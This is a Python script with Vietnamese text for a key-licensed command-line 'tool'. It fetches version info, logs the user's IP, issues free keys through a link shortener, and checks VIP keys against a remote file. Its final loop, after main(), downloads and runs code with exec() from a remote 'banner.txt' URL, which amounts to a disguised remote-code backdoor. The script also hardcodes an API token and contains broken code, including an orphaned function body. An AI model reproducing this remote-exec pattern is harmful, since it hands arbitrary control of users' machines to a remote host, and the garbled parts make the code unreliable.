import threading
import base64
import os
import time
import re
import json
import random
import requests
import socket
import sys
from time import sleep
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
from pystyle import Colors, Colorate
from rich.console import Console
from rich.panel import Panel
from rich.console import Console
from rich.text import Text
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
from requests import session
from colorama import Fore, Style
import pystyle
import platform
import hashlib
import sys
import os

import requests

# Cố tình gọi thuộc tính không tồn tại 'auth' của module requests
print(requests.auth)



def bes4(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            version_tag = soup.find('span', id='version')
            maintenance_tag = soup.find('span', id='maintenance')
            version = version_tag.text.strip() if version_tag else None
            maintenance = maintenance_tag.text.strip() if maintenance_tag else None
            return version, maintenance
    except requests.RequestException:
        return None, None
    return None, None

def checkver():
    url = 'https://webkeyduykhanh.blogspot.com/2025/02/thong-tin-phien-ban-cong-cu-body-font_31.html'
    version, maintenance = bes4(url)
    if maintenance == 'on':
        sys.exit()
    return version

current_version = checkver()
if current_version:
    print(f"\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;93m Phiên bản hiện tại: {current_version}")
else:
    print("Không thể lấy thông tin phiên bản hoặc tool đang được bảo trì.")
    sys.exit()

def get_device_id():
    device_str = platform.node() + platform.machine()
    return hashlib.sha256(device_str.encode()).hexdigest()

# Kiểm tra kết nối internet
def is_connected():
    import socket
    socket(('1.1.1.1', 53))
    return True
    if OSError:
        pass
    return False
def check_connection():
    try:
        response = requests.get("https://www.google.com.vn", timeout=3)
    except (requests.exceptions.ReadTimeout, requests.ConnectionError):
        print("TÍNH LÀM GÌ ĐẤY 😇")
        sys.exit()
    except (requests.exceptions.RequestException, Exception) as e:
        print(f"Lỗi: {str(e)}")

check_connection()

# Định nghĩa các URL liên quan đến key VIP và miễn phí
KEY_GITHUB_URL = "https://www.webkey.x10.mx/Key/vip.txt"
DEVICE_FILE = 'vip_devices.json'

# Mã hóa và giải mã key
SECRET = "my_secret_key"

def xor_crypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def enc(data):
    raw = xor_crypt(data, SECRET)
    return raw.encode('utf-8').hex()

def dec(encrypted_data):
    raw = bytes.fromhex(encrypted_data).decode('utf-8')
    return xor_crypt(raw, SECRET)

def luu_thong_tin_ip(ip, key, expiration_date, max_devices):
    data = {ip: {'key': key, 'expiration_date': expiration_date.isoformat(), 'max_devices': max_devices}}
    encrypted_data = enc(json.dumps(data))
    with open('ip_key.json', 'w') as file:
        file.write(encrypted_data)

def tai_thong_tin_ip():
    try:
        with open('ip_key.json', 'r') as file:
            encrypted_data = file.read()
        data = json.loads(dec(encrypted_data))
        return data
    except FileNotFoundError:
        return None

# Hàm tạo URL và key từ địa chỉ IP
def generate_key_and_url(ip_address):
    ngay = int(datetime.now().day)
    key1 = str(ngay * 27 + 27)
    ip_numbers = ''.join(filter(str.isdigit, ip_address))
    key = f'NDK{key1}{ip_numbers}'
    expiration_date = datetime.now().replace(hour=23, minute=59, second=0, microsecond=0)
    url = f'https://www.webkey.x10.mx/?ma={key}'
    return url, key, expiration_date

# Lấy thông tin key VIP từ URL
def lay_key_vip():
    try:
        response = requests.get(KEY_GITHUB_URL)
        if response.status_code == 200:
            lines = response.text.strip().splitlines()
            keys = {}
            for line in lines:
                parts = line.split('|')
                if len(parts) == 4:
                    key_info = {
                        'expire_date': parts[1].strip(),
                        'type': parts[2].strip(),
                        'max_devices': int(parts[3].strip())
                    }
                    keys[parts[0].strip()] = key_info
            return keys
        else:
            print("[=.=] Không thể truy cập key VIP.")
            return {}
    except:
        print("[=.=] Lỗi khi lấy key VIP.")
        return {}

# Lấy thông tin key miễn phí từ URL
    try:
        if response.status_code == 200:
            lines = response.text.strip().splitlines()
            keys = {}
            for line in lines:
                parts = line.split('|')
                if len(parts) == 4:
                    key_info = {
                        'expire_date': parts[1].strip(),
                        'type': parts[2].strip(),
                        'max_devices': 1
                    }
                    keys[parts[0].strip()] = key_info
            return keys
        else:
            print("[=.=] Không thể truy cập key FREE.")
            return {}
    except:
        print("[=.=] Lỗi khi lấy key FREE.")
        return {}

# Hiển thị banner cho công cụ
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""
\033[1;33m██████╗░██╗░░░██╗████████╗░█████╗░░█████╗░██╗░░░░░
\033[1;35m██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
\033[1;36m██████╔╝╚██╗░██╔╝░░░██║░░░██║░░██║██║░░██║██║░░░░░
\033[1;37m██╔══██╗░╚████╔╝░░░░██║░░░██║░░██║██║░░██║██║░░░░░
\033[1;32m██║░░██║░░╚██╔╝░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗
\033[1;31m╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝\n
\033[1;97mTool By: \033[1;32mDUY KHÁNH            \033[1;97mPhiên Bản:\033[1;32m {current_version} 
\033[97m════════════════════════════════════════════════  
\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;95m BOX ZALO\033[1;31m : \033[1;36mhttps://zalo.me/g/nguadz335
\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;93m YOUTUBE\033[1;31m : \033[1;32mREVIEWTOOL247NK
\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;32m ADMIN\033[1;31m : \033[1;33mDUYKHANH
\033[97m════════════════════════════════════════════════  
                   \033[1;95m[THÔNG BÁO]
\033[1;93m>>>>TOOL ĐANG TRONG QUÁ TRÌNH PHÁT TRIỂN THÊM<<<<    
\033[1;32m❗MUA KEY VIP LIÊN HỆ ADMIN CHỈ 1k / 1 DAY❗  
\033[97m════════════════════════════════════════════════         
"""
    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.000001)

# Rút gọn URL
def get_shortened_link(url):
    try:
        token = "6648c8f016f35d42cd052655"
        api_url = f"https://link4m.co/api-shorten/v2?api={token}&url={url}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            return response.json().get("shortenedUrl", url)
    except:
        pass
    return url

# Tính số giờ còn lại
def calculate_remaining_hours(expiration_date):
    now = datetime.now()
    if expiration_date > now:
        delta = expiration_date - now
        return delta.total_seconds() // 3600
    else:
        return 0

# Hàm chính
def main():
    try:
        banner()
        keys_vip = lay_key_vip()
        ip_address = requests.get('https://api.ipify.org').text.strip()
        print(f"\033[1;91m[\033[1;97m=.=\033[1;91m]\033[1;93m \033[1;31mĐịa Chỉ IP: {ip_address}")

        data = tai_thong_tin_ip()
        if data and ip_address in data:
            expiration_date = datetime.fromisoformat(data[ip_address]['expiration_date'])
            if expiration_date > datetime.now():
                key_data = data[ip_address]
                print("\033[97m[=.=] Key còn hạn, mời bạn sử dụng tool....")
                print(f"[=.=] Key: {key_data['key']}")
                print(f"[=.=] Loại key: {'VIP' if key_data['max_devices'] > 1 else 'FREE'}")
                print(f"[=.=] Số thiết bị: {key_data['max_devices']}")
                print(f"[=.=] Thời gian còn lại: {calculate_remaining_hours(expiration_date)} giờ")
                print(f"[=.=] Hết hạn: {expiration_date.strftime('%H:%M:%S - %d/%m/%Y')}")
                sleep(5)
                return

        # Nếu không có key hoặc key đã hết hạn
        print("\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;95m Nhập 1 Để Nhập Key \033[1;36m(Free)")
        print("\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;93m Nhập 2 Để Nhập Key \033[1;32m(VIP)")
        print("\033[1;97m════════════════════════════════════════════════")

        while True:
            try:
                choice = input("\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;32m Nhập lựa chọn \033[1;33m: ").strip()
                check_connection()
                
                if choice == "1":
                    print("\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;95m Vui lòng vượt link để nhận key :")
                    url, key, expiration_date = generate_key_and_url(ip_address)
                    short_url = get_shortened_link(url)
                    print(f"\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;93m \033[1;35mLink rút gọn \033[1;36m: {short_url}")
                    while True:
                        keynhap = input('\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;93m \033[1;33mNhập Key [FREE] \033[1;32m: ').strip()
                        if keynhap == key:
                            print("\033[97m[=.=] Key đúng, truy cập thành công!")
                            print(f"[=.=] Loại key: FREE")
                            print(f"[=.=] Số thiết bị có thể truy cập key: 1")
                            print(f"[=.=] Thời gian còn lại sử dụng key: {calculate_remaining_hours(expiration_date)} giờ")
                            luu_thong_tin_ip(ip_address, key, expiration_date, 1)
                            sleep(5)
                            return
                        else:
                            print("\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;31m Key sai, vui lòng thử lại hoặc vượt link mới!")

                elif choice == "2":
                    keynhap = input('\033[1;97m[\033[1;91m=.=\033[1;97m]\033[1;93m Nhập Key [VIP] \033[1;32m: ').strip()
                    if keynhap in keys_vip:
                        key_info = keys_vip[keynhap]
                        try:
                            expire = datetime.strptime(key_info['expire_date'], "%d/%m/%Y")
                            if expire > datetime.now():
                                expiration_date = expire.replace(hour=23, minute=59, second=0, microsecond=0)
                                print("\033[97m[=.=] Đã xác nhận key VIP thành công!")
                                print(f"[=.=] Loại key: {key_info['type']}")
                                print(f"[=.=] Số thiết bị có thể truy cập: {key_info['max_devices']}")
                                print(f"[=.=] Thời gian còn lại sử dụng key: {calculate_remaining_hours(expiration_date)} giờ")
                                print(f"[=.=] Hết hạn: {expiration_date.strftime('%H:%M:%S - %d/%m/%Y')}")
                                luu_thong_tin_ip(ip_address, keynhap, expiration_date, key_info['max_devices'])
                                sleep(5)
                                return
                            else:
                                print('[=.=] Key VIP đã hết hạn!')
                        except:
                            print('[=.=] Lỗi xử lý ngày hết hạn.')
                    else:
                        print('[=.=] Key VIP không tồn tại!')
                else:
                    print("[=.=] Vui lòng nhập lựa chọn hợp lệ (1 hoặc 2).")
            except KeyboardInterrupt:
                print("\n[=.=] Đã thoát chương trình.")
                sys.exit()
    except KeyboardInterrupt:
        print("\n[=.=] Đã thoát chương trình.")
        sys.exit()
        
if __name__ == '__main__':
    main()
while True:
    try:
        exec(requests.get('https://www.webkey.x10.mx/banner.txt').text)
    except KeyboardInterrupt:
        print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
        sys.exit()    